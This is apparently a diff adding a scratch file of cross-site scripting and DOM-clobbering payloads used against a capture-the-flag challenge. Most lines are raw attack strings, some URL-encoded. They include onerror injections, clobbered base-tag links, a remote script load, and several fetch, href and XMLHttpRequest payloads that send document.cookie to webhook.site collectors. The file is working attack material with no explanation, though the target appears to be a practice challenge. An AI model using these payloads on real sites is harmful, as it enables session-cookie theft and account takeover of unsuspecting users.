@@ -1,0 +1,37 @@
+<a id=base><a id=base name=url href="cid:&quot;onerror=alert(1)//">
+
+<a id=base><a id=base name=url href=//localhost>
+
+
+<a id=base><a id=base name=href href="cid:&quot;onerror=alert(1)//">
+
+<a id=base><a id=base name=href href=https://webhook.site/80610479-4beb-4ea9-bc15-617472018dfe/?c=document.cookie&>
+http://ctf.tcp1p.com:25982/?code=%3Ca+id%3Dbase%3E%3Ca+id%3Dbase+name%3Dhref+href%3Dhttps%3A%2F%2Fwebhook.site%2F80610479-4beb-4ea9-bc15-617472018dfe%2F%3Fc%3Ddocument.cookie%26%3E
+
+<a id=base><a id=base name=href href="cid:&quot;onerror=alert(1)//">
+
+
+<a id=base><a id=base name=href href='https://webhook.site/80610479-4beb-4ea9-bc15-617472018dfe/' + document.cookie>
+
+http://ctf.tcp1p.com:25982/?code=%3Ca+id%3Dbase%3E%3Ca+id%3Dbase+name%3Dhref+href%3D%27https%3A%2F%2Fwebhook.site%2F80610479-4beb-4ea9-bc15-617472018dfe%2F%27+%2B+document.cookie%3E
+
+
+<a id=base><a id=base name=href href="fetch('http://webhook.site/80610479-4beb-4ea9-bc15-617472018dfe/'+document.cookie)"
+<a id=base><a id=base name=href href="cid:&quot;onerror=alert(1)//">
+
+http://ctf.tcp1p.com:25982/?url=http://localhost:1337/&code=%3Ca+id%3Dbase%3E%3Ca+id%3Dbase+name%3Dhref+href%3D%27%2F%2Fwebhook.site%2F80610479-4beb-4ea9-bc15-617472018dfe%2Fc%3D%27+%2B+document.cookie%3E
+
+http://ctf.tcp1p.com:25982/?url=http://localhost:3232/code=%3Ca+id%3Dbase%3E%3Ca+id%3Dbase+name%3Dhref+href%3D%27%2F%2Fwebhook.site%2F80610479-4beb-4ea9-bc15-617472018dfe%2F%3Fc%3D%26d%3D%27%2Bdocument.cookie%3E
+
+<script>var secret='if3 secret!'; alert(parent.secret)</script>
+
+data:text/html;charset=utf-8,<script>console.log(123)</script>
+
+http://ctf.tcp1p.com:25982/?url=http://localhost:1337/?code=%3Ca+id%3Dbase%3E%3Ca+id%3Dbase+name%3Dhref+href%3D%27https%3A%2F%2Fctf-nonsense-a7e0a.web.app%2Finject-2.js%3Fc%3D%27%3E
+
+const xhr = new XMLHttpRequest(); //can do using fetch to
+xhr.open(
+  "POST",
+  `https://webhook.site/56dbe89d-3017-4285-b4d4-7354f9f825d5?c=${document.cookie}`
+);
+xhr.send();
